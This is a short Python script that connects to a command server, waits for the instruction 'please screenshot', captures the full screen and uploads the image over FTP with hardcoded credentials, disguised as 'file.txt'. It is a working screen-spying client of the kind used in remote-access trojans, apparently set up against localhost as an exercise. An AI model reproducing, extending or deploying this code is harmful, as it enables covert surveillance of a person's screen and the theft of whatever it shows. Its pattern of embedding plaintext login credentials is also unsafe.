from PIL import ImageGrab
from ftplib import FTP
import socket

def self_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")
    screenshot.close()


def upload_file():
    ftp = FTP()
    ftp.connect('127.0.0.1', 21)
    ftp.login('dori', 'avmybaby')

    local_file = 'screenshot.png'
    remote_file = 'file.txt'

    with open(local_file, 'rb') as f:
        ftp.storbinary(f"STOR {remote_file}", f)

    print(f"File '{local_file}' uploaded successfully.")

    ftp.quit()


def main_tcp_process():
    host = '127.0.0.1'
    port = 12345
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_socket.connect((host, port))
        print(f"Connected to server {host}:{port}")

        while True:
            print("Waiting for a message from the server...")
            message = client_socket.recv(1024).decode('utf-8')
            if message == 'please screenshot':
                self_screenshot()  # Takes a screenshot
                upload_file()  # Uploads the screenshot to the ftp server

    except ConnectionError as e:
        print(f"Connection error: {e}")

    finally:
        client_socket.close()
        print("Connection closed")

    print("Done successfully.")
